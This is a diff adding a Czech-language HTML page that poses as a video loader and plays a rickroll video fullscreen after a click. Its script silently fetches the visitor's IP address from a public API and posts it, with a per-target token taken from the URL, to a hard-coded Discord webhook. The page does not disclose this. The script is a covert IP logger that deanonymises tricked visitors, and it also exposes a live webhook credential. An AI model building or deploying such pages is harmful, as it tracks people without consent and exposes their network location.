@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <title>Video System</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; cursor: pointer; color: white; font-family: sans-serif; }
+        video { width: 100%; height: 100%; object-fit: cover; display: none; }
+        #status { text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div id="status">
+        <h1>Načítání obsahu...</h1>
+        <p>Klepněte pro pokračování</p>
+    </div>
+
+    <video id="myVideo" loop>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+
+    <script>
+        // --- KONFIGURACE ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1461819438948159601/1uQkuVDBbgrAtPCVvRnqDVjm1bGoOX12twRjQ9HALL4i4HEvyLbH4PuQlcMcs11_iE8P";
+        
+        // Funkce pro získání IP a odeslání logu
+        async function logVisit(token) {
+            try {
+                // Získání IP adresy přes veřejné API
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // Odeslání dat na Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ **Rickroll Úspěšný!**\n**Uživatel:** \`${token}\` \n**IP Adresa:** \`${userIp}\` \n**Status:** Sleduje video na fullscreen.`
+                    })
+                });
+            } catch (err) {
+                console.error("Chyba při logování:", err);
+            }
+        }
+
+        const video = document.getElementById('myVideo');
+        const status = document.getElementById('status');
+
+        document.body.addEventListener('click', function() {
+            // 1. Získání tokenu z URL (?tkn=dan)
+            const urlParams = new URLSearchParams(window.location.search);
+            const token = urlParams.get('tkn') || "Neznámý uživatel";
+
+            // 2. Fullscreen
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+
+            // 3. Spuštění videa a logování
+            status.style.display = 'none';
+            video.style.display = 'block';
+            video.play();
+
+            // Zavoláme logovací funkci
+            logVisit(token);
+        }, { once: true }); // Spustí se jen při prvním kliknutí
+    </script>
+</body>
+</html>
